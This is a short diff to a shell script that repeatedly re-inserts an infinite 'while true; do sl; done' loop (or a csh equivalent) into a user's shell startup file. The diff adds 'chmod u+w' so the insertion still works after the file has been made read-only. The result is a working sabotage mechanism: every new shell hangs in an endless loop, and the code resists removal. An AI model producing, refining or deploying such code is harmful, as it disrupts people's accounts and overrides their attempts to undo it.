@@ -7,11 +7,13 @@ function poll_for_removal_of_while_loop {
 	if [[ "$type_of_shell" -eq "1" ]]; then
 		status_rc_file=`cat $rc_file 2>/dev/null| grep "while true; do sl; done"`
 		if [[ -z "$status_rc_file" ]]; then
+			chmod u+w $rc_file
 			echo -e "\nwhile true; do sl; done"|cat>>$rc_file
 		fi
 	else
 		status_rc_file=`cat $rc_file 2>/dev/null|grep  "while (1)"`
 		if [[ -z "$status_rc_file" ]]; then
+			chmod u+w $rc_file
 			echo -e "\nwhile (1)\n sl\n end"|cat>>$rc_file
 		fi
 	fi
